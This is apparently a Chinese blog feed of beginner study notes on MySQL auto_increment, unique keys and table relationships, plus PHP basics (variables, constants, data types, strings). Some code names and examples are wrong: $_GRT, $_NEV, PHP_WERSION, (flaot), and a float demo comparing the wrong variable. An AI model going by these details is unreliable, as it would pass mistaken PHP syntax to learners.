<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>自动增长的原理：</p>
<ol>
<li><p>在系统中有维护一组数据，用来保存当前使用了自动增长属性的字段，记住当前对应的数据值，再给定一个指定的步长</p>
</li>
<li><p>当用户进行数据插入的时候，如果没有给定值，系统在原始值上再加上步长变成新的数据</p>
</li>
<li><p>自动增长的触发：给定属性的字段没有提供值</p>
</li>
<li><p>自动增长只适用于数值</p>
</li>
</ol>
<h3 id="使用自动增长"><a href="#使用自动增长" class="headerlink" title="使用自动增长"></a>使用自动增长</h3><p>基本语法：在字段之后增加一个属性<code>auto_increment</code></p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202151324813.png" alt="image-20210202151324813"></p>
<p>插入数据：触发自动增长，不能给定具体值</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202151431059.png" alt="image-20210202151431059"></p>
<h3 id="修改自动增长"><a href="#修改自动增长" class="headerlink" title="修改自动增长"></a>修改自动增长</h3><ol>
<li>查看自增长：自增长一旦触发使用之后，会自动的在表选项中增加一个选项（一张表最多只能拥有一个自增长）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202151610015.png" alt="image-20210202151610015"></p>
<ol start="2">
<li>表选项可以通过修改表结构来实现</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 auto_increment = 值;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202151324813.png" alt="image-20210202151756130"></p>
<h3 id="删除自动增长"><a href="#删除自动增长" class="headerlink" title="删除自动增长"></a>删除自动增长</h3><p>删除自增长：就是在字段属性之后不再保留auto_increment，当用户修改自增长所在字段时，如果没有看到auto_increment属性，系统会自动清除该自增长</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202151929007.png" alt="image-20210202151929007"></p>
<h3 id="初始设置"><a href="#初始设置" class="headerlink" title="初始设置"></a>初始设置</h3><p>在系统中，有一组变量用来维护自增长的初始值和步长</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;auto_increment%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202152237890.png" alt="image-20210202152237890"></p>
<h3 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h3><ol>
<li><p>一张表只有一个自增长：自增长会上升到表选项中</p>
</li>
<li><p>如果数据插入中没有触发自增长（给定了数据），那么自增长不会表现</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202152551652.png" alt="image-20210202152551652"></p>
<ol start="3">
<li>自增长修改的时候，值可以较大，但是不能比当前已有的自增长字段的值小</li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202152839685.png" alt="image-20210202152839685"></p>
<h2 id="唯一键"><a href="#唯一键" class="headerlink" title="唯一键"></a>唯一键</h2><p>唯一键：unique key，用来保证对应的字段中的数据唯一的。</p>
<p>主键也可以用来保证字段数据唯一性，但是一张表只有一个主键。</p>
<ol>
<li><p>唯一键在一张表中可以有多个。</p>
</li>
<li><p>唯一键允许字段数据为NULL，NULL可以有多个（NULL不参与比较）</p>
</li>
</ol>
<h3 id="创建唯一键"><a href="#创建唯一键" class="headerlink" title="创建唯一键"></a>创建唯一键</h3><ol>
<li>直接在表字段之后增加唯一键标识符：<code>unique[key]</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202153554592.png" alt="image-20210202153554592"></p>
<ol start="2">
<li>在所有的字段之后使用<code>unique key(字段列表)</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202153605292.png" alt="image-20210202153605292"></p>
<ol start="3">
<li>在创建完表之后也可以增加唯一键</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> <span class="keyword">unique</span> <span class="keyword">key</span>(字段列表);</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202153622092.png" alt="image-20210202153622092"></p>
<h3 id="查看唯一键"><a href="#查看唯一键" class="headerlink" title="查看唯一键"></a>查看唯一键</h3><p>唯一键是属性，可以通过查看表结构来实现</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202153835259.png" alt="image-20210202153835259"></p>
<p>唯一键效果：在不为空的情况下，不允许重复</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202154034665.png" alt="image-20210202154034665"></p>
<p>在查看表创建语句的时候，会看到与主键不同的一点：多出一个“名字”</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202154229227.png" alt="image-20210202154229227"></p>
<h3 id="删除唯一键"><a href="#删除唯一键" class="headerlink" title="删除唯一键"></a>删除唯一键</h3><p>一个表中允许存在多个唯一键：假设命令为主键一样：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">unique</span> <span class="keyword">key</span>;		//错误的</span><br></pre></td></tr></table></figure>
<p>Index关键字：索引，唯一键是索引一种（提升查询效率）</p>
<p>删除的基本语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">index</span> 唯一键名字;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202154740150.png" alt="image-20210202154740150"></p>
<h3 id="修改唯一键"><a href="#修改唯一键" class="headerlink" title="修改唯一键"></a>修改唯一键</h3><p>先删除后增加</p>
<h3 id="复合唯一键"><a href="#复合唯一键" class="headerlink" title="复合唯一键"></a>复合唯一键</h3><p>唯一键与主键一样 可以使用多个字段来共同保证唯一性；</p>
<p> 一般主键都是单一字段（逻辑主键），而其他需要唯一性的内容都是由唯一键来处理。</p>
<h2 id="表关系"><a href="#表关系" class="headerlink" title="表关系"></a>表关系</h2><p>表关系：表与表之间（实体）有什么样的关系，每种关系应该如何设计表结构。</p>
<h3 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h3><p>一对一：一张表中的一条记录与另外一张表中最多有一条明确的关系：通常，此设计方案保证两张表中使用同样的主键即可</p>
<p>学生表</p>
<table>
<thead>
<tr>
<th>学生ID（PRI）</th>
<th>姓名</th>
<th>年龄</th>
<th>性别</th>
<th>籍贯</th>
<th>婚否</th>
<th>住址</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>表的使用过程中：常用的信息会经常去查询，而不常用的信息会偶尔才会用到。</p>
<p>解决方案：将两张表拆分，常见的放一张表，不常见的放一张表</p>
<p>常用表</p>
<table>
<thead>
<tr>
<th>学生ID（PRI）</th>
<th>姓名</th>
<th>年龄</th>
<th>性别</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>不常用表</p>
<table>
<thead>
<tr>
<th>学生ID（PRI）</th>
<th>籍贯</th>
<th>婚否</th>
<th>住址</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h3><p>一对多，通常也叫作多对一的关系。通常一对多的关系设计的方案，在“多”关系的表中去维护一个字段，这个字段是“一”关系的主键。</p>
<p>母亲表</p>
<table>
<thead>
<tr>
<th>母亲ID</th>
<th>姓名</th>
<th>年龄</th>
<th>身高</th>
</tr>
</thead>
<tbody><tr>
<td>M1</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>M2</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>孩子表</p>
<table>
<thead>
<tr>
<th>孩子ID</th>
<th>姓名</th>
<th>年龄</th>
<th>身高</th>
<th>母亲ID</th>
</tr>
</thead>
<tbody><tr>
<td>K1</td>
<td></td>
<td></td>
<td></td>
<td>M1</td>
</tr>
<tr>
<td>K2</td>
<td></td>
<td></td>
<td></td>
<td>M1</td>
</tr>
</tbody></table>
<h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><p>多对多：一张表中的一条记录在另外一张表中可以匹配到多条记录，反过来也一样。</p>
<p>多对多的关系如果按照多对一的关系维护：就会出现一个字段中有多个其他表的主键，在访问的时候就会带来不便。</p>
<p>既然通过两张表自己增加字段解决不了问题，那么就通过第三张表来解决。</p>
<p>师生关系</p>
<ol>
<li><p>一个老师教过多个班级的学生；</p>
</li>
<li><p>一个学生听过多个老师讲的课；</p>
</li>
</ol>
<p>首先得有两个实体：老师表和学生表</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210202160043144.png" alt="image-20210202160043144"></p>
<p>从中间设计一张表：维护两张表对应的联系：每一种联系都包含</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/blob/main/blog-img/image-20210202160309724.png" alt="image-20210202160309724"></p>
<p>多对多解决方案；增加一个中间表，让中间表与对应的其他表形成两个多对一的关系：多对一的解决方案是在“多”表中增加“一”表对应的主键字段。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础</title>
    <url>/2021/01/23/PHP%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="PHP语法初步"><a href="#PHP语法初步" class="headerlink" title="PHP语法初步"></a>PHP语法初步</h2><p>PHP是一种运行在服务器端的脚本语言，可以嵌入到HTML中。</p>
<h2 id="代码标记"><a href="#代码标记" class="headerlink" title="代码标记"></a>代码标记</h2><p>在PHP历史发展中，可以使用多种标记来区分PHP脚本。</p>
<p>ASP标记：&lt;% php代码 %&gt;</p>
<p>短标记：&lt;? php代码 ?&gt; ，以上两种基本启用，如果要使用需要在配置文件中开启</p>
<p>脚本标记：&lt;scritp language=”php”&gt;php代码&lt;/script&gt;</p>
<p>标准标记（常用）：&lt;?php php代码 ?&gt;</p>
<h2 id="PHP注释"><a href="#PHP注释" class="headerlink" title="PHP注释"></a>PHP注释</h2><p>习惯：所有的代码在写的过程中都必须进行注释，对于初学者而言注释就是个人学习和写代码的一个思路说明。</p>
<p>PHP中注释分为两种：行注释和块注释</p>
<p>行注释：一次注释一行</p>
<p>​        //：后面跟的所有内容都是注释</p>
<p>​        #：同上</p>
<p>块注释：一次注释一段</p>
<p>​        /* xxx */：中间直到*/出现之前，全部都是注释。</p>
<h2 id="语句分割符"><a href="#语句分割符" class="headerlink" title="语句分割符"></a>语句分割符</h2><p>语句分隔符：在PHP中，代码是以行为单位，系统需要通过判断行的结束，该结束通常是一个符号：分号“ ; ”（英文状态下的分号）</p>
<p>定义内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>特殊说明：</p>
<p>​    1、PHP中标记结束符?&gt;有自带语句结束符的效果，最后一行PHP代码可以没有语句结束符“ ; ”</p>
<p>​    2、PHP中其实很多代码的书写并不是嵌入到HTML中，而是单独存在，通常书写习惯中就不建议使用标记结束符?&gt;，PHP会自动从开始到最后全部认为是PHP代码</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量基本概念"><a href="#变量基本概念" class="headerlink" title="变量基本概念"></a>变量基本概念</h3><p>变量来源于数学，是计算机语言中能存储计算结果或能表示抽象概念，变量可以通过变量名风闻。指令式语言中，变量通常是可变的。</p>
<p>​    1、变量是用来存储数据的；</p>
<p>​    2、变量是存在名字的；</p>
<p>​    3、变量是通过名字来访问的：数据；</p>
<p>​    4、变量是可以改变的：数据。</p>
<h3 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h3><p>​    1、定义：在系统中增加对应的变量名字（内存）</p>
<p>​    2、赋值：可以将数据赋值给变量名（可以在定义的同时完成）</p>
<p>​    3、可以通过变量名访问存储的数据</p>
<p>​    4、可以将变量从内存中删除：使用：unset(‘变量名’)</p>
<h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h3><p>​    1、PHP中的所有变量都必须使用“$”符号；    </p>
<p>​    2、名字由字母、数字和下划线“_”构成，但是不能以数字开头；</p>
<p>​    3、在PHP中本身还允许中文变量（不建议）</p>
<h3 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h3><p>预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据（预定义变量都是数组）</p>
<p>$_GRT:获取所有表单以get方法提交的数据</p>
<p>$_POST:POST提交的数据都会保存在此</p>
<p>$_REQUEST:GET和POST提交的都会保存</p>
<p>$_GLOBALS:PHP中所有全局变量</p>
<p>$_SERVER:服务器信息</p>
<p>$_SESSION:session会话数据</p>
<p>$_COOKIE:cookie 会话数据</p>
<p>$_NEV:环境信息</p>
<p>$_FILES:用户上传的文件信息</p>
<h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p>可变变量：如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另一个变量的值：在变量前面再多加一个$符号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;bb&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$a</span> --&gt; bb </span><br></pre></td></tr></table></figure>


<h3 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h3><p>变量传值：将一个变量赋值给另外一个变量</p>
<p>变量传值一共有两种方式：值传递，引用传递</p>
<p>值传递：将变量保存的值复制一份，然后将新的值给另外一个变量保存（两个变量没有关系）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">	<span class="variable">$b</span>= <span class="variable">$a</span>;		<span class="comment">//值传递</span></span><br><span class="line">	<span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>; <span class="comment">//1,2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>引用传递：将变量保存的值所在的地址，传递给另外一个变量：两个变量指向同一个内存空间（两个变量是同一个值）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">	<span class="variable">$b</span>= &amp;<span class="variable">$a</span>;		<span class="comment">//引用传递</span></span><br><span class="line">	<span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>,<span class="variable">$b</span>; <span class="comment">//2,2</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>变量与变量一样，都是用来保存数据的。</p>
<h3 id="常量基本概念"><a href="#常量基本概念" class="headerlink" title="常量基本概念"></a>常量基本概念</h3><p>常量：const/constant ，是一种在程序运行中，不可改变的量（数据）</p>
<p>常量一旦定义，通常数据不可改变（用户级别）</p>
<h3 id="常量定义形式"><a href="#常量定义形式" class="headerlink" title="常量定义形式"></a>常量定义形式</h3><p>在PHP中常量有两种定义方式（5.3之后才有两种）</p>
<p>​    1、使用定义常量的函数：define(‘常量名’,常量值)；</p>
<p>​    2、5.3之后才有的：const 常量名 = 值；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&#x27;PI&#x27;</span>,<span class="number">3.14</span>);	<span class="comment">//使用函数定义常量</span></span><br><span class="line"><span class="keyword">const</span> PII = <span class="number">3</span>;		<span class="comment">//使用const关键字定义</span></span><br></pre></td></tr></table></figure>
<p>常量名字的命名规则</p>
<p>​    1、常量不需要使用“$”符号，一旦使用系统会认为是变量；</p>
<p>​    2、常量的名字组成由字母、数字和下划线组成，不能以数字开头；</p>
<p>​    3、常量的名字通常以大写字母为主（与变量以示区别）；</p>
<p>​    4、常量名字的规则比变量要松散，可以使用一些特殊字符，该方法只能使用define定义；</p>
<p>注意细节：</p>
<p>​    1、define和const定义的常量是有区别：在于访问权限区别</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&#x27;-_-&#x27;</span>,smile);	<span class="comment">//正确</span></span><br><span class="line"><span class="keyword">const</span> -_- = <span class="string">&#x27;smile&#x27;</span>; 	<span class="comment">//错误</span></span><br></pre></td></tr></table></figure>
<p>​    2、定义常量通常不区分大小写，但是可以区分，可以参照define函数的第三个；</p>
<h3 id="常量使用形式"><a href="#常量使用形式" class="headerlink" title="常量使用形式"></a>常量使用形式</h3><p>常量的使用与变量一样：不可改变值（在定义的时候必须赋值）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> PI;</span><br></pre></td></tr></table></figure>
<p>有的时候还需要另外一种形式来访问（针对的是特殊名字的常量），需要用到另外一个访问常量的函数：constant(‘常量名’)；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> -_-;	<span class="comment">//错误，特殊符号不能直接使用</span></span><br><span class="line">constant(<span class="string">&#x27;-_-&#x27;</span>);	<span class="comment">//错误</span></span><br></pre></td></tr></table></figure>
<p>说明：常量和变量的使用</p>
<p>​    1、凡是数据会可能变化的，那么肯定是用变量</p>
<p>​    2、数据不一定会变的，可以使用常量或者变量（变量居多）</p>
<p>​    3、数据不允许被修改的，一定用常量</p>
<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><p>系统常量：系统帮助用户定义的常量，用户可以直接使用</p>
<p>常用的几个系统常量：</p>
<p>​    1、PHP_WERSION：PHP版本号</p>
<p>​    2、PHP_INT_SIZE：整形大小（所占用的字节数）</p>
<p>​    3、PHP_INT_MAX：整形能表示的最大值（PHP中整形是允许出现负数的：带符号）</p>
<p>在PHP中还有一些特殊的常量，他们有双下划线开始+常量名+双下划线结束，这种常量称之为系统魔术常量：魔术常量的值通常会跟着环境变化，但是用户改变不了</p>
<p>​    1、__DIR__：当前被执行的脚本所在电脑的绝对路径</p>
<p>​    2、__FILE__：当前被执行的脚本所在电脑的绝对路径（带自己文件的名字）</p>
<p>​    3、__LINE__：当前所属的行数</p>
<p>​    4、__NAMESPACE__：当前所属的命名空间</p>
<p>​    5、__CLASS__：当前所属的类</p>
<p>​    6、__METHOD__：当前所属的方法</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型：data type，在PHP中指的是存储的数据本身的类型，而不是变量的类型。PHP是一种弱类型语言，变量本身没有数据类型。</p>
<h3 id="PHP的八种数据类型"><a href="#PHP的八种数据类型" class="headerlink" title="PHP的八种数据类型"></a>PHP的八种数据类型</h3><p>在PHP中将数据分为三大类八小类：</p>
<p>简单（基本）数据类型：4个小类</p>
<p>​    整形：int/integer，系统分配4个字节存储，表示整数类型（有前提）</p>
<p>​    浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数</p>
<p>​    字符串型：string，系统根据实际长度分配，表示字符串（引号）</p>
<p>​    布尔类型：bool/boolean，表示布尔类型，只有两个值：true和false</p>
<p>复合数据类型：2个小类</p>
<p>​    对象类型：object，存放对象（面向对象）</p>
<p>​    数组类型：array，存储多个数据（一次性）</p>
<p>特殊数据类型：2个小类</p>
<p>​    资源类型：resource，存放资源数据（PHP外部数据，如数据库、文件）</p>
<p>​    空类型：NULL，只有一个值就是NULL（不能运算）</p>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>类型转换：在很多的条件下，需要指定的数据类型，需要外部数据（当前PHP取得的数据），转换成目标数据类型</p>
<p>在PHP中有两种类型转换方式：</p>
<p>​    1、自动转换：系统根据需求自己判定，自己转换（用得比较多，效率偏低）    </p>
<p>​    2、强制（手动）转换：认为根据需要的目标类型转换</p>
<p>​        强制转换规则：在变量之前增加一个括号()，然后在里面写上对应类型：int/integer…其中NULL类型用到unset()</p>
<p>在转换过程中，用得比较多的就是转布尔类型（判断）和转数值类型（算数运算）</p>
<p>其他类型转布尔类型：true或者false，在PHP中比较少类型转换变成false</p>
<p>其他类型转数值的说明：</p>
<p>​    1、布尔true为1，false为0；</p>
<p>​    2、字符串转数值有自己的规则</p>
<p>​        2.1、以字母开头的字符串，永远为0；</p>
<p>​        2.2、以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点 ）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;abc1.1.1&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;1.1.1abc&#x27;</span>;</span><br><span class="line"><span class="comment">//自动转换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> + <span class="variable">$b</span>;	<span class="comment">//算数+运算，系统先转换为数值类型（整形或浮点型），然后运算</span></span><br><span class="line"><span class="comment">//强制转换</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">float</span>)<span class="variable">$a</span>,(flaot)<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>


<h3 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h3><p>通过一组类型判断函数，来判断变量，最终返回这个变量所保存数据的数据类型（相同结果为true，不同为false）：是一组以is_开头后跟乐星名字的函数：is_XXX(变量名)</p>
<p>Bool类型不能用echo来查看，可以使用var_dump结构来查看</p>
<p>var_dump(变量1,变量2…)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(is_int(<span class="variable">$a</span>));	<span class="comment">//bool(false)</span></span><br><span class="line">var_dump(is_string(<span class="variable">$a</span>));	<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure>
<p>还有一组函数可以用来获取以及设定数据（变量）的类型</p>
<p>gettype(变量名)：获取类型，得到的是该类型对应的字符串</p>
<p>settype(变量名,类型)：设定数据类型：与强制转换不同</p>
<p>​    1、强制转换（类型）变量名，是对数据值复制的内容进行处理（不会处理实际存储的内容）</p>
<p>​    2、settype会直接改变数据本身</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;abc1.1.1&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">float</span>)<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> gettype(<span class="variable">$a</span>);		<span class="comment">//string,强制转换不会改变数据类型</span></span><br><span class="line">var_dump(settype(<span class="variable">$a</span>,<span class="string">&#x27;int&#x27;</span>));	<span class="comment">//bool(true)，会改变数据本身</span></span><br><span class="line"><span class="keyword">echo</span> gettype(<span class="variable">$a</span>),<span class="variable">$a</span>;		<span class="comment">//int,a--&gt;1</span></span><br></pre></td></tr></table></figure>


<h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>整数类型：保存整数数值（范围限制），4个字节存储数据，最大就是32位：42亿多。但是在PHP中默认是有符号类型（区分正负数）</p>
<p>在PHP中提供了4种整型的定义方式：十进制定义，二进制定义，八进制定义，十六进制定义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a1</span> = <span class="number">110</span>;		<span class="comment">//十进制</span></span><br><span class="line"><span class="variable">$a2</span> = <span class="number">0b110</span>;		<span class="comment">//二进制</span></span><br><span class="line"><span class="variable">$a3</span> = <span class="number">0110</span>;		<span class="comment">//八进制</span></span><br><span class="line"><span class="variable">$a4</span> = <span class="number">0x110</span>;		<span class="comment">//十六进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a1</span>,<span class="string">&#x27;~&#x27;</span>,<span class="variable">$a2</span>,<span class="string">&#x27;~&#x27;</span>,<span class="variable">$a3</span>,<span class="string">&#x27;~&#x27;</span>,<span class="variable">$a4</span>;		<span class="comment">//110~6~72~272，默认PHP输出数值都会自动转换成10进制输出</span></span><br></pre></td></tr></table></figure>
<p>十进制：逢10进1，能够出现的数字是0~9</p>
<p>二进制：逢2进1，能够出现的数字是0~1</p>
<p>十进制：逢8进1，能够出现的数字是0~7</p>
<p>十进制：逢16进1，能够出现的数字是0<del>9以及a</del>f，a表示10，f表示15</p>
<p>进制转换：手动转换</p>
<p>​    十进制转二进制：除2倒取余法：不管得到的结果如何，需要补足32位：前面补0</p>
<p>​    十进制转二进制：取出最大的2的N次方，直到结果为0：从二进制右侧开始，按照对应的指数次数位置补1，没有的补0</p>
<p>​    二进制转十进制：从右侧开始，将对应的第几位作为2的指数，然后将所有的结果相加</p>
<p>PHP中不需要用户这么复杂的去计算，提供了许多函数进行转换</p>
<p>decbin()：十进制转二进制</p>
<p>decoct()：十进制转八进制</p>
<p>dechex()：十进制转十六进制</p>
<p>bindec()：二进制转十进制</p>
<p>bin2hex()：二进制转十六进制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(decbin(<span class="number">107</span>)); 	<span class="comment">//string(7) &quot;1101011&quot;</span></span><br></pre></td></tr></table></figure>


<h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><p>浮点型：小数类型以及超过整形所能存储范围的整数（不保证精度），精度范围大概在15个有效数字左右</p>
<p>浮点型定义有两种方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$f1</span> = <span class="number">1.23</span>;		</span><br><span class="line"><span class="variable">$f2</span> = <span class="number">1.23e10</span>;	<span class="comment">//科学计数法1.23乘10的10次方</span></span><br><span class="line"><span class="variable">$f3</span> = PHP_INT_MAX + <span class="number">1</span>;	<span class="comment">//整型超过自身存储的大小之后会用浮点型存储</span></span><br></pre></td></tr></table></figure>
<p>尽量不用浮点数做精确判断：浮点数保存的数据不够精确，而且在计算机中凡是小鼠基本上存的都不精确。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$f4</span> = <span class="number">0.7</span>;</span><br><span class="line"><span class="variable">$f5</span> = <span class="number">2.1</span>;</span><br><span class="line"><span class="variable">$f6</span> = <span class="variable">$f5</span> / <span class="number">3</span>;</span><br><span class="line">var_dump(<span class="variable">$f4</span> == <span class="variable">$f5</span>);	<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure>


<h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>布尔类型：两个值true和false，通常用于判断比较。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b1</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b2</span> = <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$b1</span>,<span class="variable">$b2</span>);	<span class="comment">//bool(true)bool(false)</span></span><br></pre></td></tr></table></figure>
<p>在进行某些数据判断的时候，需要特别注意类型转换</p>
<p>empty()：判断数据的值是否为“空”，不是NULL，如果为空返回true，不为空返回false</p>
<p>isset()：判断数据存储的变量本身是否存在，存在变量返回true，不存在返回false</p>
<h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><h4 id="字符串定义语法"><a href="#字符串定义语法" class="headerlink" title="字符串定义语法"></a>字符串定义语法</h4><p>​    1、单引号字符串：使用单引号包裹</p>
<p>​    2、双引号字符串：使用双引号包裹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引号定义</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$str1</span>,<span class="variable">$str2</span>);		<span class="comment">//string(5) &quot;hello&quot;,string(5) &quot;hello&quot;</span></span><br></pre></td></tr></table></figure>
<p>引号方式：比较适合定义那些比较短（不超过一行）或者没有结构要求的字符串，如果有结构要求，或者内容超过一行，可以使用以下两种结构定义    </p>
<p>​    3、nowdoc字符串：没有单引好的单引号字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = &lt;&lt;&lt;<span class="string">&#x27;边界符&#x27;</span></span><br><span class="line">    字符串内容</span><br><span class="line">边界符;</span><br></pre></td></tr></table></figure>
<p>​    4、heredoc字符串：没有双引号的双引号字符串</p>
